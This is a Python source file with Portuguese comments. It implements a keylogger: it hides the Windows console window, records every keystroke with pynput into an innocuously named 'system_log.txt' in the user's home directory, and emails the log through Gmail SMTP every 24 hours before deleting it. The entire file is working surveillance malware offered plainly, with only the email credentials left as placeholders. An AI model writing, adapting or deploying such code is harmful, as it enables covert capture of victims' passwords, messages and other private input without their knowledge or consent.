import os
import sys
import logging
import smtplib
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from pynput import keyboard

#  Esconde a janela do console no Windows
if sys.platform == "win32":
    import ctypes
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

#  Caminho do arquivo de log
log_file = os.path.expanduser("~") + "/system_log.txt"

#  Configuração do logger
logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s - %(message)s")

# Função para capturar as teclas pressionadas
def on_press(key):
    try:
        logging.info(f"{key.char}")  # Teclas normais
    except AttributeError:
        logging.info(f"[{key}]")  # Teclas especiais

#  Função para enviar e-mail com o log
def send_email():
    remetente = "seuemail@gmail.com"
    senha = "suasenha"
    destinatario = "destino@gmail.com"

    with open(log_file, "r") as file:
        log_content = file.read()

    if log_content.strip():  # Envia o email apenas se houver algo no log
        msg = MIMEMultipart()
        msg["From"] = remetente
        msg["To"] = destinatario
        msg["Subject"] = "Registro de teclas capturado"

        msg.attach(MIMEText(log_content, "plain"))

        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(remetente, senha)
            server.send_message(msg)
            server.quit()
            print("E-mail enviado com sucesso!")
        except Exception as e:
            print(f"Erro ao enviar e-mail: {e}")

#  Loop que envia o log a cada 24h e depois deleta o arquivo
def schedule_email():
    while True:
        time.sleep(86400)  # Espera 24 horas (86400 segundos)
        send_email()
        os.remove(log_file)  # Deleta o arquivo de log
        logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s - %(message)s")  # Cria novo log vazio

#  Inicia o keylogger
import threading
email_thread = threading.Thread(target=schedule_email, daemon=True)
email_thread.start()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
